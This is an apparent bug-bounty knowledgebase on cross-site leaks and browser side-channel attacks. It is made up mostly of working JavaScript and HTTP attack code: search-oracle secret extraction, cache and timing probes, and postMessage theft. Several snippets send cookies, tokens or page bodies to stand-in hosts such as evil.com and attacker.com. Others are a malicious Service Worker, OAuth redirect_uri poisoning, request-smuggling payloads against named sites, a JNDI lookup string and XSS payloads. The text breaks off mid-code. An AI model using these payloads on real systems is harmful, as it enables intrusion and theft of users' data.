# XS-Leaks & Browser Side-Channel Attack Knowledgebase

> **Research-grade compilation for advanced bug bounty hunting and black-box testing**
> 
> Sources: PortSwigger Research, XS-Leaks Wiki, HackTricks, MDN Web APIs, GitHub Security Repos, Nuclei Templates, SecLists, and real-world bug bounty case studies.

---

## Table of Contents

1. [Basics](#basics)
2. [XS-Leaks Theory](#xs-leaks-theory)
3. [Browser Side-Channel Internals](#browser-side-channel-internals)
4. [XS-Search Techniques](#xs-search-techniques)
5. [Timing Attacks](#timing-attacks)
6. [Frame Counting Attacks](#frame-counting-attacks)
7. [Cache Probing Attacks](#cache-probing-attacks)
8. [Error-Based Leaks](#error-based-leaks)
9. [postMessage Leaks](#postmessage-leaks)
10. [Window Reference Leaks](#window-reference-leaks)
11. [Focus/Blur Leaks](#focusblur-leaks)
12. [BroadcastChannel Leaks](#broadcastchannel-leaks)
13. [SharedWorker Leaks](#sharedworker-leaks)
14. [Service Worker Leaks](#service-worker-leaks)
15. [IntersectionObserver Leaks](#intersectionobserver-leaks)
16. [Cross-Origin State Inference](#cross-origin-state-inference)
17. [OAuth + XS-Leaks Chains](#oauth--xs-leaks-chains)
18. [Cache Poisoning + XS-Leaks Chains](#cache-poisoning--xs-leaks-chains)
19. [Request Smuggling + XS-Leaks Chains](#request-smuggling--xs-leaks-chains)
20. [Parser Confusion Payloads](#parser-confusion-payloads)
21. [Browser Quirks](#browser-quirks)
22. [Gadget Chains](#gadget-chains)
23. [Real World Case Studies](#real-world-case-studies)
24. [Fuzzing Payloads](#fuzzing-payloads)
25. [Automation Workflows](#automation-workflows)
26. [Recon Methodology](#recon-methodology)
27. [Nuclei Templates](#nuclei-templates)
28. [Tools and Scanners](#tools-and-scanners)
29. [Advanced Research](#advanced-research)
30. [Bug Bounty Writeups](#bug-bounty-writeups)
31. [Payload Collections](#payload-collections)
32. [WAF Bypasses](#waf-bypasses)
33. [Detection Techniques](#detection-techniques)
34. [References](#references)

---

## Basics

### What Are XS-Leaks?

Cross-Site Leaks (XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web's core principle of composability — allowing websites to interact with each other — and abuse legitimate mechanisms to infer information about the user.

**XS-Leaks vs CSRF:**
- **CSRF**: Forces a victim to perform an action on a target site
- **XS-Leaks**: Forces a victim to reveal information about their state on a target site

### Core Principle

Websites cannot directly read cross-origin responses, but they can:
- Load subresources (images, scripts, iframes)
- Navigate to URLs
- Send messages via postMessage
- Observe side effects (timing, errors, cache behavior, frame count)

By observing these side effects, an attacker can infer sensitive information.

### The Oracle Concept

An **oracle** is a binary (YES/NO) piece of information exposed during cross-origin interactions:

> **Question**: Does the word "secret" appear in the user's search results?
> 
> **Equivalent to**: Does `?query=secret` return HTTP 200 (onload) vs 404 (onerror)?

```javascript
// Basic oracle example
const img = new Image();
img.onload = () => console.log("YES - word exists");
img.onerror = () => console.log("NO - word does not exist");
img.src = "https://target.com/search?q=secret";
```

### Attack Requirements

1. **Target endpoint** that behaves differently based on user state
2. **Side-channel** to observe the difference cross-origin
3. **Ability to trigger** the interaction from attacker-controlled origin

---

## XS-Leaks Theory

### Root Cause

The root cause is inherent to web design. Browsers provide APIs for interaction between sites, and small information leaks occur during these interactions. Fixing root causes often breaks legitimate websites, so browsers implement **opt-in defense mechanisms** via HTTP headers.

**Sources of XS-Leaks:**
1. **Browser APIs**: Frame counting, Timing attacks, Navigation timing
2. **Browser implementation details**: Connection pooling, typeMustMatch, parser behaviors
3. **Hardware bugs**: Speculative execution (Meltdown/Spectre)

### History

- **2000**: Timing attacks to leak web activity known since at least 2000
- **2015**: Gelernter & Herzberg publish "Cross-Site Search Attacks" exploiting timing against Google/Microsoft
- **2018+**: Browser defenses emerge (SameSite cookies, COOP, COEP, CSP)
- **2020+**: XS-Leaks wiki formalized; new techniques discovered regularly

### Defense Mechanisms

| Header | Purpose |
|--------|---------|
| `Cross-Origin-Opener-Policy: same-origin` | Prevents window reference leaks |
| `Cross-Origin-Embedder-Policy: require-corp` | Blocks cross-origin resources without CORP |
| `Cross-Origin-Resource-Policy: same-origin` | Prevents cross-origin embedding |
| `SameSite=Lax/Strict` | CSRF/XS-Leak cookie protection |
| `X-Content-Type-Options: nosniff` | Prevents MIME sniffing side-channels |
| `Content-Security-Policy` | Restricts resource loading |
| `Referrer-Policy` | Controls referrer leakage |

**Note**: Many defenses must be **combined** to achieve full protection. COOP alone without COEP does not prevent all leaks.

---

## Browser Side-Channel Internals

### Event Loop & Timing

Browsers use a single-threaded event loop. Heavy tasks block the loop, which can be measured cross-origin via:
- `performance.now()` differences
- `setTimeout` drift
- Message event delays

```javascript
// Measuring event loop blocking
const start = performance.now();
setTimeout(() => {
    const elapsed = performance.now() - start;
    // If target did heavy work, elapsed > expected
}, 0);
```

### Connection Pooling

Browsers maintain separate connection pools:
- **With cookies** vs **without cookies**
- **HTTP/1.1** vs **HTTP/2**
- **Per-origin** pools

**XS-Leak implication**: Connection pool exhaustion can be detected by timing how long new connections take to establish.

```javascript
// Connection pool exhaustion probe
async function probePool() {
    const start = performance.now();
    await fetch('https://target.com/unique', {credentials: 'include'});
    return performance.now() - start;
}
```

### Cache Architecture

Browser caches are **partitioned** by:
- Top-level site (since 2020+ in most browsers)
- Origin
- URL

**Cache probing** works by measuring load times of cached vs uncached resources.

### Navigation & Resource Loading Pipeline

1. DNS resolution (measurable via timing)
2. TCP/TLS handshake (connection pooling observable)
3. HTTP request/response
4. Parsing & rendering (frame count, errors)
5. JavaScript execution (event loop blocking)

Each step can leak information cross-origin.

---

## XS-Search Techniques

### Cross-Site Search (XS-Search)

XS-Search uses XS-Leaks to determine if specific content exists in a user's private data. The attacker:
1. Crafts search queries on the target
2. Uses side-channels to determine if results exist
3. Repeats to exfiltrate the full search term or data

```javascript
// XS-Search via error events
async function searchOracle(query) {
    return new Promise((resolve) => {
        const script = document.createElement('script');
        script.onload = () => resolve(true);  // Results exist
        script.onerror = () => resolve(false); // No results
        script.src = `https://target.com/search?q=${encodeURIComponent(query)}`;
        document.head.appendChild(script);
    });
}

// Binary search to extract a secret
async function extractSecret() {
    let known = '';
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';

    for (let i = 0; i < 32; i++) {
        for (const char of chars) {
            const query = known + char;
            if (await searchOracle(query)) {
                known += char;
                console.log('Progress:', known);
                break;
            }
        }
    }
    return known;
}
```

### Search Endpoint Requirements

Ideal targets for XS-Search:
- Return **different status codes** based on results (200 vs 404)
- Return **different content lengths** measurable via timing
- Trigger **different parsing behaviors** (JavaScript vs HTML vs JSON)
- Have **different redirect behaviors**

### Query Injection Points

```
?q=admin
?search=secret
?query=test&filter=private
?keyword=CONFIDENTIAL
?term=password
```

---

## Timing Attacks

### Network Timing

Measure the time it takes to load a resource. Different response sizes or server-side processing times leak information.

```javascript
// Basic timing probe
async function timingProbe(url) {
    const start = performance.now();
    try {
        await fetch(url, {mode: 'no-cors', credentials: 'include'});
    } catch(e) {}
    return performance.now() - start;
}

// Statistical timing analysis
async function measureTiming(url, samples = 10) {
    const times = [];
    for (let i = 0; i < samples; i++) {
        times.push(await timingProbe(url + '&cb=' + Math.random()));
    }
    return {
        mean: times.reduce((a,b) => a+b) / times.length,
        min: Math.min(...times),
        max: Math.max(...times)
    };
}
```

### Event Loop Blocking + Lazy Images

Force the target to perform heavy work, then measure when your own code runs:

```javascript
// Event loop blocking detection
function probeEventLoop() {
    const img = new Image();
    const start = performance.now();

    img.onload = img.onerror = () => {
        const elapsed = performance.now() - start;
        // If target processed heavy image, elapsed is longer
    };

    // Target endpoint that processes images conditionally
    img.src = 'https://target.com/generate-thumbnail?file=secret.pdf';
}
```

### Performance.now() + Force Heavy Task

```javascript
// Force target to do heavy computation, measure via performance.now()
async function heavyTaskLeak() {
    const start = performance.now();

    // Trigger target processing
    await fetch('https://target.com/api/process-heavy', {
        mode: 'no-cors',
        credentials: 'include'
    });

    // Immediately schedule work
    await new Promise(r => setTimeout(r, 0));

    const leak = performance.now() - start;
    return leak > 100 ? 'heavy' : 'light';
}
```

### Navigation Timing API

```javascript
// Using PerformanceNavigationTiming
const navEntry = performance.getEntriesByType('navigation')[0];
console.log({
    dns: navEntry.domainLookupEnd - navEntry.domainLookupStart,
    tcp: navEntry.connectEnd - navEntry.connectStart,
    response: navEntry.responseEnd - navEntry.responseStart,
    dom: navEntry.domComplete - navEntry.domInteractive
});
```

### Resource Timing API

```javascript
// Observe resource loading times cross-origin (limited by Timing-Allow-Origin)
const observer = new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {
        if (entry.name.includes('target.com')) {
            console.log('Duration:', entry.duration);
            console.log('Transfer size:', entry.transferSize); // 0 if cached
        }
    }
});
observer.observe({entryTypes: ['resource']});
```

### Connection Pool Timing

```javascript
// Detect if target keeps connections alive
async function connectionPoolProbe() {
    const start = performance.now();
    await fetch('https://target.com/static/resource', {
        credentials: 'include'
    });
    return performance.now() - start; // Fast = reused connection
}
```

---

## Frame Counting Attacks

### Window.length / Frames.length

Before COOP, `window.length` leaked the number of frames in a cross-origin window.

```javascript
// Classic frame counting leak
const win = window.open('https://target.com/search?q=test');
setTimeout(() => {
    const frames = win.length;
    // If frames > 0, results page loaded frames (has results)
    // If frames == 0, no results or different page
}, 2000);
```

**Mitigation**: `Cross-Origin-Opener-Policy: same-origin` prevents `window.opener` access cross-origin.

### Iframe Frame Counting

```javascript
// Count frames in an iframe
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/dashboard';
iframe.onload = () => {
    try {
        const count = iframe.contentWindow.length;
        // Leaks number of subframes in target dashboard
    } catch(e) {
        // COOP/COEP blocked access
    }
};
```

### History.length Leaks

Navigation changes `history.length`. Can detect if target redirected:

```javascript
const before = history.length;
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/protected-resource';
iframe.onload = () => {
    const after = history.length;
    if (after > before) {
        // Target redirected (resource exists vs auth redirect)
    }
};
```

---

## Cache Probing Attacks

### Principle

Determine if a resource is in the browser cache by measuring load time. Cached resources load faster (no network request or 304 Not Modified).

```javascript
// Cache probe via timing
async function cacheProbe(url) {
    const start = performance.now();
    await fetch(url, {mode: 'no-cors'});
    const time = performance.now() - start;
    return time < 50 ? 'cached' : 'not-cached';
}
```

### Application to XS-Leaks

Determine if user visited specific pages:
```javascript
async function visitedPageProbe(pageUrl) {
    const isCached = await cacheProbe(pageUrl);
    return isCached === 'cached';
}
```

### Cache Probing with Error Events

Some resources error when not cached due to CORS, but succeed when cached:
```javascript
function cacheProbeError(url) {
    return new Promise(resolve => {
        const img = new Image();
        img.onload = () => resolve(true);
        img.onerror = () => resolve(false);
        img.src = url;
    });
}
```

### Advanced Cache Probing

```javascript
// Use fetch with cache control to force revalidation
async function advancedCacheProbe(url) {
    // First: no-store to establish baseline
    const noStoreStart = performance.now();
    await fetch(url, {cache: 'no-store', mode: 'no-cors'});
    const noStoreTime = performance.now() - noStoreStart;

    // Then: default to check cache
    const defaultStart = performance.now();
    await fetch(url, {mode: 'no-cors'});
    const defaultTime = performance.now() - defaultStart;

    return defaultTime < noStoreTime * 0.5 ? 'cached' : 'not-cached';
}
```

### ETag / 304 Probing

```javascript
// Probe if resource was previously fetched (ETag match)
async function etagProbe(url) {
    const response = await fetch(url, {mode: 'no-cors'});
    // If 304, it was in cache. Status code not readable cross-origin
    // But timing difference is observable
}
```

---

## Error-Based Leaks

### Onload vs Onerror

The most fundamental XS-Leak primitive:

```javascript
function errorOracle(url) {
    return new Promise(resolve => {
        const script = document.createElement('script');
        script.onload = () => resolve('success');   // HTTP 200, valid JS
        script.onerror = () => resolve('error');    // HTTP 404/500, invalid JS
        script.src = url;
        document.head.appendChild(script);
    });
}
```

**Key insight**: Browsers fire `onerror` for HTTP 4xx/5xx on script tags, and `onload` for 2xx even if the content isn't valid JavaScript (some browsers).

### Status Code Detection

Different resources trigger different error behaviors:

| Resource Type | 200 OK | 404 Not Found | 302 Redirect |
|--------------|--------|---------------|--------------|
| `<script>` | onload | onerror | onload (if valid) |
| `<img>` | onload | onerror | onload |
| `<link rel=stylesheet>` | onload | onerror | onload |
| `<iframe>` | load | error (some cases) | load |
| `fetch()` | resolves | rejects | resolves/rejects |

### JSONP Error Leaks

JSONP endpoints that return HTML error pages vs JavaScript callbacks:
```javascript
// If search has results: returns callback({results: [...]})
// If no results: returns HTML 404 page -> script onerror
const script = document.createElement('script');
script.src = 'https://target.com/search?callback=cb&q=secret';
script.onload = () => console.log('Results exist');
script.onerror = () => console.log('No results');
```

### Cross-Origin Read Blocking (CORB) & XS-Leaks

CORB blocks certain cross-origin resource loads (HTML, XML, JSON) to prevent Spectre attacks. However, CORB itself leaks information:
- Resource blocked by CORB → different timing than allowed resource
- Can distinguish between JSON (blocked) and image (allowed) responses

```javascript
// CORB oracle: JSON blocked, image allowed
async function corbOracle(url) {
    const start = performance.now();
    const img = new Image();
    img.src = url;

    await new Promise(r => {
        img.onload = img.onerror = r;
    });

    const time = performance.now() - start;
    // If very fast, likely blocked by CORB
    return time < 10 ? 'json/html' : 'other';
}
```

---

## postMessage Leaks

### postMessage Side-Channel Theory

`postMessage` is designed for cross-origin communication, but improper implementations leak state:
- **No origin validation**: Any site can send messages and receive responses
- **Message reflection**: Target echoes back data that reveals state
- **Event timing**: Time to process a message reveals server-side state

### Origin Validation Bypasses

```javascript
// Weak origin check bypasses
// 1. Null origin (file://, iframe sandbox)
// 2. Origin endsWith check
window.parent.postMessage('data', '*'); // Wildcard - no validation

// Bypass endsWith:
// Expected: https://trusted.com
// Bypass: https://evil.com/https://trusted.com
```

### postMessage XS-Leak via Message Reflection

```javascript
// Attacker iframe
const target = window.open('https://target.com/chat');

setInterval(() => {
    // Send probe message
    target.postMessage({action: 'getUnreadCount'}, '*');
}, 1000);

window.addEventListener('message', e => {
    // If target doesn't validate origin, we get the response
    if (e.data.unreadCount > 0) {
        console.log('User has unread messages');
    }
});
```

### Stealing postMessage via Iframe Location Manipulation

```javascript
// If target uses event.source.postMessage(reply, event.origin)
// But we can navigate the target window after it opens
const win = window.open('https://target.com/app');

// Race: navigate to attacker before postMessage sent
setTimeout(() => {
    win.location = 'https://attacker.com/catcher';
}, 10);

// catcher.html receives the reply meant for target
window.addEventListener('message', e => {
    console.log('Stolen reply:', e.data);
});
```

### postMessage + DOM Clobbering

```javascript
// If target uses DOM properties for message routing
// and we can clobber those properties

// target.com vulnerable code:
// window.config.channel.postMessage(data)

// Attacker clobbers config:
// <iframe name="config" src="...">
// Then sends message to wrong channel
```

### postMessage Tracker Methodology

From `fransr/postMessage-tracker`:
1. Hook `window.postMessage` to log all messages
2. Identify targets that broadcast without origin checks
3. Fuzz message formats to trigger state leaks

```javascript
// Hook postMessage to discover communication patterns
const originalPostMessage = window.postMessage;
window.postMessage = function(...args) {
    console.log('postMessage:', args);
    return originalPostMessage.apply(this, args);
};
```

---

## Window Reference Leaks

### window.opener

When `target="_blank"` or `window.open()` is used without `noopener`, the opened window retains a reference to the opener.

```html
<!-- Vulnerable link -->
<a href="https://target.com" target="_blank">Click</a>

<!-- Safe link -->
<a href="https://target.com" target="_blank" rel="noopener noreferrer">Click</a>
```

```javascript
// In opened window, attacker can navigate opener
if (window.opener) {
    window.opener.location = 'https://attacker.com/phishing';
}
```

### Cross-Origin Window Properties

Before modern mitigations, these properties leaked cross-origin:
- `win.location.href` (partial, after redirect)
- `win.history.length`
- `win.length` (frame count)
- `win.closed` (boolean)
- `win.opener` (exists or not)

```javascript
// Detect if target redirected by observing window properties
const win = window.open('https://target.com/protected');

setInterval(() => {
    if (win.closed) {
        console.log('Window closed - auth required?');
    }
    try {
        const href = win.location.href; // May throw or reveal redirect
    } catch(e) {
        // Cross-origin blocked
    }
}, 100);
```

### COOP Mitigation

```http
Cross-Origin-Opener-Policy: same-origin
```

This places the document in a new browsing context group, severing `window.opener` and `window.open()` cross-origin references.

### Bypassing COOP with Framing

If target doesn't send `X-Frame-Options` or CSP `frame-ancestors`, embed in iframe:
```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com';
// iframe.contentWindow properties may leak if same-origin
```

---

## Focus/Blur Leaks

### Focus Events as Oracles

Focus/blur events fire cross-origin when:
- A window/iframe gains or loses focus
- Can detect if user interacted with a specific target

```javascript
// Detect if target window is focused
const win = window.open('https://target.com/app');

win.addEventListener('blur', () => {
    console.log('User left target window');
});

win.addEventListener('focus', () => {
    console.log('User focused target window');
});
```

### Focus-Based XS-Leak

Determine if a cross-origin iframe contains focusable elements:
```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/search?q=secret';
iframe.onload = () => {
    iframe.contentWindow.focus();

    // If focus succeeded, page has focusable elements
    // If focus failed/throws, different state
};
```

### Blur Timing Attacks

```javascript
// Measure time between focus and blur to infer page complexity
const start = performance.now();
win.focus();
win.addEventListener('blur', () => {
    const time = performance.now() - start;
    // Long time = complex page loaded
});
```

---

## BroadcastChannel Leaks

### BroadcastChannel Theory

`BroadcastChannel` allows same-origin communication across tabs/windows/frames. **Key limitation**: Partitioned by top-level site (since 2022+ in most browsers).

```javascript
// Same-origin only
const bc = new BroadcastChannel('test_channel');
bc.postMessage('sensitive_data'); // Only same-origin receivers get this
```

### XS-Leak via BroadcastChannel

If attacker can inject code on target origin (XSS, subdomain takeover), they can use BroadcastChannel to leak data to attacker-controlled same-origin page.

```javascript
// In XSS on target.com
const bc = new BroadcastChannel('exfil');
bc.postMessage({
    cookie: document.cookie,
    localStorage: localStorage.getItem('token'),
    page: location.href
});
```

```javascript
// Attacker on same origin (subdomain or XSS)
const bc = new BroadcastChannel('exfil');
bc.onmessage = (event) => {
    fetch('https://evil.com/log?data=' + btoa(JSON.stringify(event.data)));
};
```

### BroadcastChannel + Storage Partitioning Bypass

Before full partitioning:
```javascript
// Third-party iframe could communicate via BroadcastChannel
// if storage partitioning wasn't enforced
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/iframe';
document.body.appendChild(iframe);

// iframe could create BroadcastChannel and leak to parent
// if they were considered same-partition
```

---

## SharedWorker Leaks

### SharedWorker Theory

`SharedWorker` is accessible from multiple same-origin browsing contexts. Persists as long as any page holds a reference.

```javascript
// Create shared worker
const worker = new SharedWorker('worker.js');
worker.port.start();
worker.port.postMessage('data');
```

### XS-Leak via SharedWorker

If target uses SharedWorker for sensitive operations:
1. Attacker opens target in iframe
2. Creates same SharedWorker
3. Intercepts or injects messages

```javascript
// Hijack existing SharedWorker
const worker = new SharedWorker('https://target.com/shared-worker.js');
worker.port.onmessage = (e) => {
    console.log('Intercepted:', e.data);
};
```

### SharedWorker as Persistence Mechanism

```javascript
// Use SharedWorker to maintain state across navigations
// and exfiltrate when attacker page loads
const worker = new SharedWorker('https://target.com/worker.js');
worker.port.postMessage({action: 'getCachedCredentials'});
```

---

## Service Worker Leaks

### Service Worker Interception

Service Workers can intercept and modify all requests in their scope. If an attacker registers a SW on a target origin (via XSS or path traversal), they control all subsequent requests.

```javascript
// Malicious Service Worker registration (requires XSS on target)
navigator.serviceWorker.register('/sw.js', {scope: '/'});

// sw.js
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            // Clone and exfiltrate
            const clone = response.clone();
            clone.text().then(body => {
                fetch('https://evil.com/?data=' + btoa(body));
            });
            return response;
        })
    );
});
```

### Service Worker + Cache Poisoning

```javascript
// Poison cache via SW
self.addEventListener('fetch', event => {
    event.respondWith(
        caches.match(event.request).then(response => {
            if (response) return response; // Serve poisoned cache
            return fetch(event.request);
        })
    );
});
```

### Service Worker Detection

```javascript
// Detect if target has a Service Worker
async function detectSW(url) {
    const iframe = document.createElement('iframe');
    iframe.src = url;

    return new Promise(resolve => {
        iframe.onload = async () => {
            try {
                const hasSW = await iframe.contentWindow.navigator.serviceWorker.ready;
                resolve(true);
            } catch(e) {
                resolve(false);
            }
        };
    });
}
```

---

## IntersectionObserver Leaks

### IntersectionObserver Theory

`IntersectionObserver` detects when elements enter/leave viewport. Can be used to detect if cross-origin content rendered specific elements.

```javascript
// Observe cross-origin iframe elements (limited by same-origin policy)
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com';

const observer = new IntersectionObserver((entries) => {
    for (const entry of entries) {
        if (entry.isIntersecting) {
            console.log('Element visible - specific content loaded');
        }
    }
});

iframe.onload = () => {
    // Cannot observe cross-origin iframe internals directly
    // But can observe iframe container and infer from size changes
    observer.observe(iframe);
};
```

### Size-Based Inference

```javascript
// Target page changes size based on content
const iframe = document.createElement('iframe');
iframe.style.width = '100%';
iframe.style.height = '0';
iframe.style.border = 'none';
iframe.src = 'https://target.com/search?q=secret';

const resizeObserver = new ResizeObserver((entries) => {
    for (const entry of entries) {
        const height = entry.contentRect.height;
        // Different heights indicate different content states
        if (height > 500) {
            console.log('Results page (has content)');
        } else {
            console.log('Empty/no results');
        }
    }
});

resizeObserver.observe(iframe);
```

---

## Cross-Origin State Inference

### General Methodology

Cross-Origin State Inference attacks determine the user's state on a target site by combining multiple side-channels:

1. **Authentication state**: Is user logged in?
2. **Authorization state**: Does user have admin role?
3. **Data existence**: Does user have specific emails, files, contacts?
4. **Feature flags**: Is feature X enabled for this user?

### Login Detection

```javascript
// Detect if user is logged in to target
async function isLoggedIn(targetUrl) {
    // Method 1: Image loading
    const img = new Image();
    return new Promise(resolve => {
        img.onload = () => resolve(true);  // Auth not required
        img.onerror = () => resolve(false); // Redirected to login
        img.src = targetUrl + '/avatar.jpg';
    });
}

// Method 2: Timing (login redirect adds latency)
async function isLoggedInTiming(targetUrl) {
    const start = performance.now();
    await fetch(targetUrl + '/api/profile', {mode: 'no-cors'});
    return performance.now() - start > 200; // Redirect to login takes time
}
```

### Admin Detection

```javascript
// Detect if user is admin by probing admin endpoints
async function isAdmin() {
    const results = await Promise.all([
        probeEndpoint('/admin/dashboard'),
        probeEndpoint('/admin/users'),
        probeEndpoint('/api/admin/stats')
    ]);
    return results.some(r => r === 'accessible');
}
```

### Email/Contact Enumeration

```javascript
// Check if specific email exists in user's contacts
async function hasContact(email) {
    const url = `https://target.com/api/contacts?email=${email}`;
    const script = document.createElement('script');

    return new Promise(resolve => {
        script.onload = () => resolve(true);  // Contact exists
        script.onerror = () => resolve(false); // No contact
        script.src = url;
    });
}
```

---

## OAuth + XS-Leaks Chains

### Hidden OAuth Attack Vectors

From PortSwigger research on OAuth:

#### 1. Dynamic Client Registration SSRF

OAuth registration endpoints accept URL parameters that the server fetches later:

```http
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
    "redirect_uris": ["https://attacker.com/callback"],
    "logo_uri": "http://internal.server/admin",
    "jwks_uri": "http://169.254.169.254/latest/meta-data/",
    "sector_identifier_uri": "http://attacker.com/redirects.json",
    "request_uris": ["http://attacker.com/malicious.jwt"]
}
```

**SSRF Trigger Points:**
- `logo_uri`: Fetched when displaying client approval page
- `jwks_uri`: Fetched when validating client_assertion at token endpoint
- `sector_identifier_uri`: Fetched during authorization flow
- `request_uri`: Fetched at authorization start (if supported)

```http
// Trigger logo_uri SSRF
GET /api/clients/2/logo HTTP/1.1
Host: local:8080
Cookie: JSESSIONID=...

// Server fetches logo_uri and returns content
```

#### 2. redirect_uri Session Poisoning

OAuth servers store authorization parameters in session. Race condition allows poisoning:

```javascript
// Attack flow:
// 1. User visits attacker page
// 2. Attacker opens OAuth authorize with TRUSTED client_id
// 3. Background: Attacker sends authorize with UNTRUSTED client_id + malicious redirect_uri
// 4. User approves trusted client
// 5. Server uses poisoned session redirect_uri -> token leaked to attacker

// Step 2: Open trusted authorization
window.open('https://target.com/authorize?client_id=TRUSTED&redirect_uri=https://trusted.com/callback');

// Step 3: Poison session in background
fetch('https://target.com/authorize?client_id=UNTRUSTED&redirect_uri=https://attacker.com/steal', {
    credentials: 'include',
    mode: 'no-cors'
});
```

**CVE-2021-27582**: MITREid Connect mass assignment on `/oauth/confirm_access`:
```
/authorize?client_id=trusted&redirect_uri=https://trusted.com/callback
/oauth/confirm_access?client_id=trusted&redirectUri=https://attacker.com/steal
```

#### 3. WebFinger User Enumeration

```http
GET /.well-known/webfinger?resource=http://x/admin&rel=http://openid.net/specs/connect/1.0/issuer

// Response for existing user:
HTTP/1.1 200 OK
{"subject":"http://x/admin","links":[{"rel":"...","href":"http://127.0.0.1:7077/openam/oauth2"}]}

// Response for non-existing user:
HTTP/1.1 404 Not Found
```

### OAuth + XS-Leak Chains

```javascript
// Chain OAuth redirect_uri poisoning with XS-Leak to steal tokens
// 1. Poison redirect_uri to attacker
// 2. Victim approves OAuth
// 3. Token sent to attacker via redirect
// 4. Attacker uses token via XS-Leak to probe victim's data

// XS-Leak with stolen OAuth token
async function probeWithToken(token, endpoint) {
    const response = await fetch(endpoint, {
        headers: {'Authorization': 'Bearer ' + token},
        mode: 'no-cors'
    });
    // Measure timing or errors to infer state
}
```

---

## Cache Poisoning + XS-Leaks Chains

### Practical Web Cache Poisoning

From PortSwigger research:

**Core Concept**: Poison the cache with a harmful response that gets served to other users. Unkeyed inputs in HTTP headers affect the response but aren't part of the cache key.

#### Methodology

1. **Identify unkeyed inputs** using Param Miner or manual testing
2. **Assess exploitability** (XSS, redirect, DoS)
3. **Get it cached** (understand cache rules: extension, route, status code, headers)

```http
// Identify unkeyed input
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

// Response shows header reflected:
<meta property="og:image" content="https://canary/cms/social.png" />
```

#### Basic Poisoning to XSS

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

// Response cached with XSS payload
```

#### Route Poisoning

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary

// Response: 404 - domain canary does not exist
// Register as HubSpot client, poison goodhire.com to serve attacker content
```

#### Hidden Route Poisoning

```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io

// Response: 302 to http://noshandnibble.blog/
// Hijack resource loads on blog.cloudflare.com
```

#### Local Route Poisoning (X-Original-URL / X-Rewrite-URL)

```http
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin

// Bypass WAF, access admin panel
// Cache sees key /anything but serves /admin content
```

### Cache Poisoning + XS-Leak Chain

```javascript
// 1. Poison cache to inject XS-Leak probe
// 2. All users loading poisoned page execute the probe
// 3. Probe exfiltrates their state to attacker

// Poisoned response contains:
<script>
// XS-Leak probe running in victim's browser
const img = new Image();
img.src = 'https://target.com/api/search?q=secret&cb=' + Math.random();
img.onload = () => fetch('https://attacker.com/leak?exists=1');
img.onerror = () => fetch('https://attacker.com/leak?exists=0');
</script>
```

### Cache Deception vs Poisoning

- **Poisoning**: Attacker sends request → cache stores harmful response → victims get harmful response
- **Deception**: Attacker tricks victim into caching sensitive data → attacker retrieves it from cache

---

## Request Smuggling + XS-Leaks Chains

### Browser-Powered Desync Attacks

From PortSwigger research (Black Hat USA 2022 / DEF CON 30):

**Client-Side Desync (CSD)**: Turn the victim's browser into a desync delivery platform. Poison browser connection pools to exploit single-server websites.

#### Attack Flow

```
1. Victim visits evil.com
2. JavaScript makes fetch() to target.com with crafted body
3. Browser reuses connection for next request
4. Target server misinterprets body as start of second request
5. Second request (victim's real request) gets malicious prefix prepended
```

#### Detection Methodology

**Step 1 - Find CSD Vector:**
```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 5
X

// Server ignores CL (error on POST to static file)
// Try: static files, server-level redirects, overlong URLs, /%2e%2e
```

**Step 2 - Confirm in Browser:**
```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1
X: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
});
```

**Step 3 - Exploit:**

**Store Attack** (steal credentials):
```javascript
fetch('https://target.com/store', {
    method: 'POST',
    body: "GET /store HTTP/1.1
Host: target.com

" +
          "username=admin&password=" + document.cookie,
    credentials: 'include'
});
```

**Chain/Pivot** (hit internal apps):
```javascript
// Inject headers normally impossible from browser
fetch('https://target.com/', {
    method: 'POST',
    body: "GET /internal HTTP/1.1
" +
          "Host: intranet.target.com
" +
          "User-Agent: ${jndi:ldap://x.oastify.com}

",
    credentials: 'include'
});
```

**Attack** (XSS via HEAD splicing):
```javascript
// Akamai case study: Stacked HEAD technique
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
` +
          `Host: www.capitalone.ca

` +
          `GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'  // Triggers CORS error, prevents redirect follow
}).catch(() => {
    location = 'https://www.capitalone.ca/'
});
```

#### Cisco Web VPN Case Study

Client-side cache poisoning via desync:
```javascript
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1
Host: x.psres.net
X: Y",
    credentials: 'include'
}).catch(() => {
    location = 'https://redacted/+CSCOE+/win.js'
});
```

**Result**: Browser caches redirect for `win.js` → loads attacker JS on login page.

#### Verisign Case Study

Fragmented chunk technique:
```javascript
fetch('https://www.verisign.com/%2f', {
    method: 'POST',
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1
` +
          `Host: www.verisign.com
` +
          `Connection: keep-alive
` +
          `Transfer-Encoding: chunked

` +
          `34d
x`,
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
}).catch(() => {
    // Form submission for second request
    let form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://www.verisign.com/robots.txt';
    form.enctype = 'text/plain';
    let input = document.createElement('input');
    input.name = '0

GET /<svg/onload=alert(1)> HTTP/1.1
Host: www.verisign.com

